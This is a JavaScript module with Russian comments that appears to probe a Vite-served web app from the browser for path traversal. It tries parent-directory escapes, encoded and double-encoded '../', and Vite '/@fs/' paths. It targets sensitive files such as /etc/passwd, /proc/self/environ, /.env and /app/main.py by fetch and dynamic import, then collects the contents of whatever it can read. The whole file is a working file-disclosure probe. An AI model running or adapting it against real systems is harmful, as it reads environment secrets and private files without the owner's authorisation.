// directory-test.mjs
export async function testDirectoryAccess() {
  const results = {
    canAccessParentDir: false,
    accessiblePaths: {},
    sensitiveFiles: {},
    viteStaticFiles: {},
    timestamp: new Date().toISOString(),
    errors: {}
  };

  // Попытки прочитать файлы через различные пути
  const pathsToTry = [
    // Родительские директории
    '../',
    '../../',
    '../../../',
    '../../../app/',
    '../../../etc/passwd',
    '../../../proc/version',
    
    // Абсолютные пути
    '/app/',
    '/app/main.py',
    '/etc/passwd',
    '/proc/version',
    '/proc/self/environ',
    
    // Относительные пути с обходом
    './../',
    './../../',
    'webapp/../',
    'src/../../',
    
    // Статические файлы Vite
    '/src/',
    '/public/',
    '/package.json',
    '/vite.config.ts',
    '/.env',
    '/.env.local',
    
    // Системные файлы через Vite
    '/@vite/env',
    '/@fs/../',
    '/@fs/../../',
    '/@fs/app/',
    
    // URL encoding обход
    '%2e%2e%2f',
    '%2e%2e%2f%2e%2e%2f',
    
    // Double encoding
    '%252e%252e%252f'
  ];

  for (const path of pathsToTry) {
    try {
      // Попытка fetch запроса к пути
      const response = await fetch(path);
      
      if (response.ok) {
        results.canAccessParentDir = true;
        const content = await response.text();
        results.accessiblePaths[path] = {
          status: response.status,
          contentLength: content.length,
          contentType: response.headers.get('content-type'),
          preview: content.substring(0, 200),
          success: true
        };
      } else {
        results.accessiblePaths[path] = {
          status: response.status,
          error: `HTTP ${response.status}`,
          success: false
        };
      }
    } catch (error) {
      results.errors[path] = error.message;
    }
  }

  // Попытки через import() для обхода
  const importPaths = [
    '../package.json',
    '../../package.json',
    '../../../app/main.py',
    '/app/main.py'
  ];

  for (const path of importPaths) {
    try {
      const module = await import(path);
      results.sensitiveFiles[path] = {
        type: 'import',
        content: JSON.stringify(module, null, 2),
        success: true
      };
      results.canAccessParentDir = true;
    } catch (error) {
      results.errors[`import_${path}`] = error.message;
    }
  }

  // Проверка через new URL()
  try {
    const baseUrl = new URL(window.location.href);
    const parentUrl = new URL('../', baseUrl);
    const response = await fetch(parentUrl);
    
    if (response.ok) {
      results.viteStaticFiles['parent_directory'] = {
        url: parentUrl.toString(),
        content: await response.text(),
        success: true
      };
      results.canAccessParentDir = true;
    }
  } catch (error) {
    results.errors['url_traversal'] = error.message;
  }

  return results;
}